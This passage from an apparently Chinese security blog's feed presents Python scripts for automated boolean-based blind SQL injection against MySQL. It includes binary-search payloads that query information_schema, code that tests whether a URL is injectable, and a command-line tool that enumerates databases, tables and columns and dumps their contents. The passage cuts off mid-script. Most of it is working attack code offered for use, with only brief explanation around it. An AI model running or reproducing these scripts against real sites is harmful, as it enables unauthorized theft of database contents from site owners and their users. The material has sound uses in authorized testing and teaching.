class="line">    <span class="comment">#print "num:%s"%(num)</span></div><div class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(num):</div><div class="line">        i=<span class="number">1</span></div><div class="line">        length=<span class="string">""</span></div><div class="line">        <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">            count=<span class="number">0</span></div><div class="line">            low=<span class="number">48</span></div><div class="line">            high=<span class="number">57</span></div><div class="line">            <span class="keyword">while</span> low&lt;=high:</div><div class="line">                mid=(low+high)/<span class="number">2</span></div><div class="line">                payload=<span class="string">"%s AND ORD(MID((SELECT IFNULL(CAST(length(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=0x%s AND TABLE_SCHEMA=0x%s limit %d,1),%d,1))&gt;%d-- "</span>%(url,tablename.encode(<span class="string">"hex"</span>),dbname.encode(<span class="string">"hex"</span>),n,i,mid)</div><div class="line">                <span class="comment">#print payload</span></div><div class="line">                html=requests.get(url=payload).content</div><div class="line">                <span class="keyword">if</span> basehtml==html:</div><div class="line">                    low=mid+<span class="number">1</span></div><div class="line">                    count+=<span class="number">1</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    high=mid<span class="number">-1</span></div><div class="line">            <span class="keyword">if</span> count!=<span class="number">0</span>:</div><div class="line">                length=length+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">                i=i+<span class="number">1</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">break</span></div><div class="line">        s=<span class="string">""</span></div><div class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">1</span>,int(length)+<span class="number">1</span>):</div><div class="line">            low=<span class="number">0</span></div><div class="line">            high=<span class="number">126</span></div><div class="line">            <span class="keyword">while</span> low&lt;=high:</div><div class="line">                mid=(low+high)/<span class="number">2</span></div><div class="line">                payload=<span class="string">"%s and ascii(substr((select column_name from information_schema.columns where table_name=0x%s and table_schema=0x%s limit %s,1),%s,1))&gt;%s-- "</span>%(url,tablename.encode(<span class="string">"hex"</span>),dbname.encode(<span class="string">"hex"</span>),str(n),str(c),str(mid))</div><div class="line">                html=requests.get(url=payload).content</div><div class="line">                <span class="comment">#print payload</span></div><div class="line">                <span class="keyword">if</span> html==basehtml:</div><div class="line">                    <span class="comment">#print payload</span></div><div class="line">                    low=mid+<span class="number">1</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    high=mid<span class="number">-1</span></div><div class="line">            s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">            <span class="keyword">print</span> s</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdatanum</span><span class="params">(url,basehtml,tablename,dbname)</span>:</span></div><div class="line">    i=<span class="number">1</span></div><div class="line">    s=<span class="string">""</span></div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        count=<span class="number">0</span></div><div class="line">        low=<span class="number">48</span></div><div class="line">        high=<span class="number">57</span></div><div class="line">        <span class="keyword">while</span> low&lt;=high:</div><div class="line">            mid=(low+high)/<span class="number">2</span></div><div class="line">            payload=<span class="string">"%s AND ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),%d,1))&gt;%d-- "</span>%(url,dbname,tablename,i,mid)</div><div class="line">            <span class="comment">#print payload</span></div><div class="line">            html=requests.get(url=payload).content</div><div class="line">            <span class="keyword">if</span> basehtml==html:</div><div class="line">                low=mid+<span class="number">1</span></div><div class="line">                count+=<span class="number">1</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                high=mid<span class="number">-1</span></div><div class="line">        <span class="keyword">if</span> count!=<span class="number">0</span>:</div><div class="line">            s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">            i=i+<span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">break</span></div><div class="line">    <span class="keyword">return</span> int(s)     </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dumpdatas</span><span class="params">(url,basehtml,num,columnname,tablename,dbname)</span>:</span></div><div class="line">    <span class="comment">#print "num:%s"%(num)</span></div><div class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(num):</div><div class="line">        i=<span class="number">1</span></div><div class="line">        length=<span class="string">""</span></div><div class="line">        <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">            count=<span class="number">0</span></div><div class="line">            low=<span class="number">48</span></div><div class="line">            high=<span class="number">57</span></div><div class="line">            <span class="keyword">while</span> low&lt;=high:</div><div class="line">                mid=(low+high)/<span class="number">2</span></div><div class="line">                payload=<span class="string">"%s AND ORD(MID((SELECT IFNULL(CAST(length(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),%d,1))&gt;%d-- "</span>%(url,columnname,dbname,tablename,n,i,mid)</div><div class="line">                <span class="comment">#print payload</span></div><div class="line">                html=requests.get(url=payload).content</div><div class="line">                <span class="keyword">if</span> basehtml==html:</div><div class="line">                    low=mid+<span class="number">1</span></div><div class="line">                    count+=<span class="number">1</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    high=mid<span class="number">-1</span></div><div class="line">            <span class="keyword">if</span> count!=<span class="number">0</span>:</div><div class="line">                length=length+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">                i=i+<span class="number">1</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">break</span></div><div class="line">        s=<span class="string">""</span></div><div class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">1</span>,int(length)+<span class="number">1</span>):</div><div class="line">            low=<span class="number">0</span></div><div class="line">            high=<span class="number">126</span></div><div class="line">            <span class="keyword">while</span> low&lt;=high:</div><div class="line">                mid=(low+high)/<span class="number">2</span></div><div class="line">                payload=<span class="string">"%s and ascii(substr((select %s from %s.%s limit %s,1),%s,1))&gt;%s-- "</span>%(url,columnname,dbname,tablename,str(n),str(c),str(mid))</div><div class="line">                html=requests.get(url=payload).content</div><div class="line">                <span class="comment">#print payload</span></div><div class="line">                <span class="keyword">if</span> html==basehtml:</div><div class="line">                    <span class="comment">#print payload</span></div><div class="line">                    low=mid+<span class="number">1</span></div><div class="line">                <span class="keyword">else</span>:</div><div class="line">                    high=mid<span class="number">-1</span></div><div class="line">            s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">            <span class="keyword">print</span> s</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">testurl</span><span class="params">(url,basehtml)</span>:</span></div><div class="line">    url1=<span class="string">"%s'"</span>%(url)</div><div class="line">    url2=<span class="string">'%s"'</span>%(url)</div><div class="line">    html1=requests.get(url1).content</div><div class="line">    html2=requests.get(url2).content</div><div class="line">    <span class="keyword">if</span> basehtml!=html1 <span class="keyword">and</span> basehtml!=html2:</div><div class="line">        <span class="comment">#print "this url maybe injectable,type numeric"</span></div><div class="line">        <span class="keyword">return</span> url</div><div class="line">    <span class="keyword">elif</span> basehtml!=html1 <span class="keyword">and</span> basehtml==html2:</div><div class="line">        <span class="comment">#print "this url maybe injectable,type string(\")"</span></div><div class="line">        <span class="keyword">return</span> url1</div><div class="line">    <span class="keyword">elif</span> basehtml==html1 <span class="keyword">and</span> basehtml!=html2:</div><div class="line">        <span class="comment">#print "this url maybe injectable,type string(\")"</span></div><div class="line">        <span class="keyword">return</span> url2</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    parser=OptionParser()</div><div class="line">    parser.add_option(<span class="string">"-u"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"url"</span>,help=<span class="string">"-u url"</span>)</div><div class="line">    parser.add_option(<span class="string">"-C"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"column"</span>,help=<span class="string">"-C column1,column2,...,..."</span>)</div><div class="line">    parser.add_option(<span class="string">"-T"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"table"</span>,help=<span class="string">"-T table"</span>)</div><div class="line">    parser.add_option(<span class="string">"-D"</span>,type=<span class="string">"string"</span>,dest=<span class="string">"db"</span>,help=<span class="string">"-D dadabase"</span>)</div><div class="line">    parser.add_option(<span class="string">"--dbs"</span>,action=<span class="string">"store_true"</span>,dest=<span class="string">"dbs"</span>,help=<span class="string">"inject all databases"</span>)</div><div class="line">    parser.add_option(<span class="string">"--dump"</span>,action=<span class="string">"store_true"</span>,dest=<span class="string">"dump"</span>,help=<span class="string">"dump columns with selected table and database"</span>)</div><div class="line">    parser.add_option(<span class="string">"--tables"</span>,action=<span class="string">"store_true"</span>,dest=<span class="string">"tables"</span>,help=<span class="string">"inject all tables in selected database"</span>)</div><div class="line">    parser.add_option(<span class="string">"--columns"</span>,action=<span class="string">"store_true"</span>,dest=<span class="string">"columns"</span>,help=<span class="string">"inject all columns in selected table and database"</span>)</div><div class="line">    (options,args)=parser.parse_args()</div><div class="line">    <span class="keyword">if</span> options.url <span class="keyword">and</span> len(sys.argv)==<span class="number">3</span>:</div><div class="line">        url=options.url</div><div class="line">        basehtml=requests.get(url=url).content</div><div class="line">        result=testurl(url,basehtml)</div><div class="line">        <span class="keyword">if</span> result:</div><div class="line">            <span class="keyword">print</span> <span class="string">"this url maybe injectable"</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">"this url maybe notinjectable"</span></div><div class="line">    <span class="keyword">elif</span> options.url <span class="keyword">and</span> options.dbs:<span class="comment">#--dbs</span></div><div class="line">        url=options.url</div><div class="line">        basehtml=requests.get(url=url).content</div><div class="line">        url=testurl(url,basehtml)</div><div class="line">        num=getdbnum(url,basehtml)</div><div class="line">        getdbs(url,basehtml,num)</div><div class="line">    <span class="keyword">elif</span> options.url <span class="keyword">and</span> options.tables <span class="keyword">and</span> options.db:<span class="comment">#-u url --tables -D database</span></div><div class="line">        url=options.url</div><div class="line">        db=options.db</div><div class="line">        basehtml=requests.get(url=url).content</div><div class="line">        url=testurl(url,basehtml)</div><div class="line">        num=gettablenum(url,basehtml,db)</div><div class="line">        gettables(url,basehtml,num,db)</div><div class="line">    <span class="keyword">elif</span> options.url <span class="keyword">and</span> options.columns <span class="keyword">and</span> options.table <span class="keyword">and</span> options.db:<span class="comment">#-u url --columns -T table -D database</span></div><div class="line">        url=options.url</div><div class="line">        table=options.table</div><div class="line">        db=options.db</div><div class="line">        basehtml=requests.get(url=url).content</div><div class="line">        url=testurl(url,basehtml)</div><div class="line">        num=getcolumnnum(url,basehtml,table,db)</div><div class="line">        getcolumns(url,basehtml,num,table,db)</div><div class="line">    <span class="keyword">elif</span> options.url <span class="keyword">and</span> options.dump <span class="keyword">and</span> options.column <span class="keyword">and</span> options.table <span class="keyword">and</span> options.db:<span class="comment">#-u url --dump  -C column -T table -D database</span></div><div class="line">        url=options.url</div><div class="line">        column=options.column</div><div class="line">        table=options.table</div><div class="line">        db=options.db</div><div class="line">        columns=column.split(<span class="string">","</span>)</div><div class="line">        basehtml=requests.get(url=url).content</div><div class="line">        url=testurl(url,basehtml)</div><div class="line">        num=getdatanum(url,basehtml,table,db)</div><div class="line">        <span class="keyword">for</span> column <span class="keyword">in</span> columns:</div><div class="line">            dumpdatas(url,basehtml,num,column,table,db)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="comment">#print "Please look this script help information,to use --help or -h"</span></div><div class="line">        parser.print_help()</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;python布尔盲注脚本算法完善&quot;&gt;&lt;a href=&quot;#python布尔盲注脚本算法完善&quot; class=&quot;headerlink&quot; title=&quot;python布尔盲注脚本算法完善&quot;&gt;&lt;/a&gt;python布尔盲注脚本算法完善&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;完善一下上次写的python盲注工具，之前那个盲注工具在猜取字符的时候使用的二分法，通过查找&lt;code&gt;0-126&lt;/code&gt;这个范围去采取数据库中的数据。但是当时遗留了一个问题，就是在逐个猜解数据库字符时使用二分法并没有什么问题，这时因为字符都在&lt;code&gt;0-126&lt;/code&gt;这个固定范围内，但是在猜取数据库个数、指定数据库的表个数、字段个数或者表中记录条数时，又或者是数据库名的长度、表名长度、字段名的长度时是没有一个固定的范围的，举个例子，比如在猜取表中记录个数时，记录的个数是不能确定范围的，也就是不能确定二分法的最大值，当时采用了循环自加的方式去判断，速度自然是慢了许多。今天抽时间读了一下sqlmap的payload，通过payload发现sqlmap也考虑到了这种情况，并且处理方法还是不错的。对于这种情况还是可以通过二分法判断的，将自己的方法记录一下~&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="python编程" scheme="http://yoursite.com/categories/python%E7%BC%96%E7%A8%8B/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python编程实现自动化注入之布尔盲注</title>
    <link href="http://yoursite.com/2018/06/05/pyblindsqli/"/>
    <id>http://yoursite.com/2018/06/05/pyblindsqli/</id>
    <published>2018-06-04T17:22:39.311Z</published>
    <updated>2018-06-06T12:49:43.416Z</updated>
    
    <content type="html"><![CDATA[<h1 id="python编程实现自动化注入之布尔盲注"><a href="#python编程实现自动化注入之布尔盲注" class="headerlink" title="python编程实现自动化注入之布尔盲注"></a>python编程实现自动化注入之布尔盲注</h1><p><strong>python编程实现自动化注入这个话题很有可能会写成一个系列，主要希望通过编写自动化注入工具脚本来提高自己的python代码能力和sql注入的能力，mysql数据库常见的注入分为union注入，报错注入，布尔盲注和时间盲注，这篇文章先用布尔盲注工具的编写来开个头~主要会用到optparse库去解析命令行参数，同时会用到二分有序查找算法去猜解数据库的每个字符，optparse库的用法和二分法的好处在之前的文章里都写的很清楚了，开始编写吧</strong><br><a id="more"></a></p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p><strong>布尔盲注这种注入手法主要用于页面没有回显位置而且没有报错信息的情况下，这时可以构造逻辑判断，通过页面返回的不同去判断逻辑的真假从而猜取数据库的字符</strong></p><p><strong>所以可以通过python脚本循环猜解出数据库中的内容，二分法猜解字符会比一次次循环累加要快很多，主要的思路就是先用requests请求一个正常的页面，当然这个页面是存在sql注入的，然后通过requests请求加上单双引号的url所返回的页面，通过和正常页面对比来判断为数字型注入还是字符型注入，判断的方法</strong></p><pre><code>url参数后加单引号与双引号均报错，则为数字型注入url参数后加单引号报错双引号不报错，为字符型注入且参数外为单引号url参数后加单引号不报错双引号报错，为字符型注入且参数外为双引号</code></pre><p><strong>接着就是根据页面的不同判断数据库的个数和每个数据库名的长度，然后通过二分法指定范围<code>(0-126)</code>判断出来每个数据库的名字，然后采取相同的方法判断出来指定数据库下的表名，指定数据库表名下的字段名以及数据库里的数据</strong></p><p><strong>为了更方便的理解使用，我用python写了一个盲注二分法算法模型</strong></p><p><strong>模型1:</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search</span><span class="params">(num)</span>:</span></div><div class="line">    low=<span class="number">0</span></div><div class="line">    high=<span class="number">126</span></div><div class="line">    <span class="keyword">while</span> low&lt;=high:</div><div class="line">        <span class="keyword">print</span> <span class="string">"search zone:(%d-%d)"</span>%(low,high)</div><div class="line">        mid=(low+high)/<span class="number">2</span></div><div class="line">        <span class="keyword">if</span> mid&lt;num:</div><div class="line">            low=mid+<span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            high=mid<span class="number">-1</span></div><div class="line">    <span class="keyword">return</span> (low+high+<span class="number">1</span>)/<span class="number">2</span></div><div class="line">num=input(<span class="string">"please input a number(1~126):"</span>)</div><div class="line">result=binary_search(num)</div><div class="line"><span class="keyword">print</span> result</div></pre></td></tr></table></figure><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180606/cbF63CJDd7.png?imageslim" alt="mark"></p><p><strong>模型2:</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search</span><span class="params">(num)</span>:</span></div><div class="line">    low=<span class="number">0</span></div><div class="line">    high=<span class="number">126</span></div><div class="line">    <span class="keyword">while</span> low&lt;=high:</div><div class="line">        <span class="keyword">print</span> <span class="string">"search zone:(%d-%d)"</span>%(low,high)</div><div class="line">        mid=(low+high)/<span class="number">2</span></div><div class="line">        <span class="keyword">if</span> mid&gt;num:</div><div class="line">            high=mid<span class="number">-1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            low=mid+<span class="number">1</span></div><div class="line">    <span class="keyword">return</span> (low+high<span class="number">-1</span>)/<span class="number">2</span></div><div class="line">num=input(<span class="string">"please input a number(1~126):"</span>)</div><div class="line">result=binary_search(num)</div><div class="line"><span class="keyword">print</span> result</div></pre></td></tr></table></figure><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180606/k8l4fCKaFk.png?imageslim" alt="mark"><br><strong>有了模型，有相当于有了一个轮子，通过模型可以更容易地编写出自己的盲注脚本，贴出我编写的盲注脚本</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#coding=utf-8</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdbnum</span><span class="params">(url,basehtml)</span>:</span></div><div class="line">    num=<span class="number">0</span></div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        payload=<span class="string">"%s and (select count(*) from information_schema.schemata)=%s-- "</span>%(url,str(num))</div><div class="line">        <span class="comment">#print payload</span></div><div class="line">        html=requests.get(url=payload).content</div><div class="line">        <span class="comment">#print html</span></div><div class="line">        <span class="keyword">if</span> html==basehtml:</div><div class="line">            <span class="keyword">return</span> num</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            num=num+<span class="number">1</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getdbs</span><span class="params">(url,basehtml,num)</span>:</span></div><div class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(num):</div><div class="line">    length=<span class="number">0</span></div><div class="line">        <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">            payload=<span class="string">"%s and (select length(schema_name) from information_schema.schemata limit %s,1)=%s-- "</span>%(url,str(n),str(length))</div><div class="line">            <span class="comment">#print payload</span></div><div class="line">            html=requests.get(url=payload).content</div><div class="line">            <span class="keyword">if</span> html==basehtml:</div><div class="line">            s=<span class="string">""</span></div><div class="line">                <span class="comment">#print length</span></div><div class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>):</div><div class="line">                    low=<span class="number">0</span></div><div class="line">                    high=<span class="number">126</span></div><div class="line">                    <span class="keyword">while</span> low&lt;=high:</div><div class="line">                        mid=(low+high)/<span class="number">2</span></div><div class="line">                        payload=<span class="string">"%s and ascii(substr((select schema_name from information_schema.schemata limit %s,1),%s,1))&gt;%s-- "</span>%(url,str(n),str(c),str(mid))</div><div class="line">                        html=requests.get(url=payload).content</div><div class="line">                        <span class="comment">#print payload</span></div><div class="line">                        <span class="keyword">if</span> html==basehtml:</div><div class="line">                            <span class="comment">#print payload</span></div><div class="line">                            low=mid+<span class="number">1</span></div><div class="line">                        <span class="keyword">else</span>:</div><div class="line">                            high=mid<span class="number">-1</span></div><div class="line">                    s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">                    <span class="keyword">print</span> s</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                length=length+<span class="number">1</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gettablenum</span><span class="params">(url,basehtml,dbname)</span>:</span></div><div class="line">    num=<span class="number">0</span></div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        payload=<span class="string">"%s and (select count(*) from information_schema.tables where table_schema=0x%s)=%s-- "</span>%(url,dbname.encode(<span class="string">"hex"</span>),str(num))</div><div class="line">        <span class="comment">#print payload</span></div><div class="line">        html=requests.get(url=payload).content</div><div class="line">        <span class="keyword">if</span> html==basehtml:</div><div class="line">            <span class="keyword">return</span> num</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            num=num+<span class="number">1</span>        </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">gettables</span><span class="params">(url,basehtml,num,dbname)</span>:</span></div><div class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(num):</div><div class="line">        length=<span class="number">0</span></div><div class="line">        <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">            payload=<span class="string">"%s and (select length(table_name) from information_schema.tables where table_schema=0x%s limit %s,1)=%s-- "</span>%(url,dbname.encode(<span class="string">"hex"</span>),str(n),str(length))</div><div class="line">            <span class="comment">#print payload</span></div><div class="line">            html=requests.get(url=payload).content</div><div class="line">            <span class="keyword">if</span> html==basehtml:</div><div class="line">                <span class="comment">#print length</span></div><div class="line">                s=<span class="string">""</span></div><div class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>):</div><div class="line">                    low=<span class="number">0</span></div><div class="line">                    high=<span class="number">126</span></div><div class="line">                    <span class="keyword">while</span> low&lt;=high:</div><div class="line">                        mid=(low+high)/<span class="number">2</span></div><div class="line">                        payload=<span class="string">"%s and ascii(substr((select table_name from information_schema.tables where table_schema=0x%s limit %s,1),%s,1))&gt;%s-- "</span>%(url,dbname.encode(<span class="string">"hex"</span>),str(n),str(c),str(mid))</div><div class="line">                        html=requests.get(url=payload).content</div><div class="line">                        <span class="comment">#print payload</span></div><div class="line">                        <span class="keyword">if</span> html==basehtml:</div><div class="line">                            <span class="comment">#print payload</span></div><div class="line">                            low=mid+<span class="number">1</span></div><div class="line">                        <span class="keyword">else</span>:</div><div class="line">                            high=mid<span class="number">-1</span></div><div class="line">                    s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">                    <span class="keyword">print</span> s</div><div class="line">                <span class="keyword">break</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                length=length+<span class="number">1</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcolumnnum</span><span class="params">(url,basehtml,tablename,dbname)</span>:</span></div><div class="line">    num=<span class="number">0</span></div><div class="line">    <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">        payload=<span class="string">"%s and (select count(*) from information_schema.columns where table_name=0x%s and table_schema=0x%s)=%s-- "</span>%(url,tablename.encode(<span class="string">"hex"</span>),dbname.encode(<span class="string">"hex"</span>),str(num))</div><div class="line">        <span class="comment">#print payload</span></div><div class="line">        html=requests.get(url=payload).content</div><div class="line">        <span class="keyword">if</span> html==basehtml:</div><div class="line">            <span class="keyword">return</span> num</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            num=num+<span class="number">1</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcolumns</span><span class="params">(url,basehtml,num,tablename,dbname)</span>:</span></div><div class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> range(num):</div><div class="line">        length=<span class="number">0</span></div><div class="line">        <span class="keyword">while</span> <span class="number">1</span>:</div><div class="line">            payload=<span class="string">"%s and (select length(column_name) from information_schema.columns where table_name=0x%s and table_schema=0x%s limit %s,1)=%s-- "</span>%(url,tablename.encode(<span class="string">"hex"</span>),dbname.encode(<span class="string">"hex"</span>),str(n),str(length))</div><div class="line">            <span class="comment">#print payload</span></div><div class="line">            html=requests.get(url=payload).content</div><div class="line">            <span class="keyword">if</span> html==basehtml:</div><div class="line">                <span class="comment">#print length</span></div><div class="line">                s=<span class="string">""</span></div><div class="line">                <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>):</div><div class="line">                    low=<span class="number">0</span></div><div class="line">                    high=<span class="number">126</span></div><div class="line">                    <span class="keyword">while</span> low&lt;=high:</div><div class="line">                        mid=(low+high)/<span class="number">2</span></div><div class="line">                        payload=<span class="string">"%s and ascii(substr((select column_name from information_schema.columns where table_name=0x%s and table_schema=0x%s limit %s,1),%s,1))&gt;%s-- "</span>%(url,tablename.encode(<span class="string">"hex"</span>),dbname.encode(<span class="string">"hex"</span>),str(n),str(c),str(mid))</div><div class="line">                        html=requests.get(url=payload).content</div><div class="line">                        <span class="comment">#print payload</span></div><div class="line">                        <span class="keyword">if</span> html==basehtml:</div><div class="line">                            <span class="comment">#print payload</span></div><div class="line">                            low=mid+<span class="number">1</span></div><div class="line">                        <span class="keyword">else</span>:</div><div class="line">                            high=mid<span class="number">-1</span></div><div class="line">                    s=s+chr((low+high+<span class="number">1</span>)/<span class="number">2</span>)</div><div class="line">                    <span 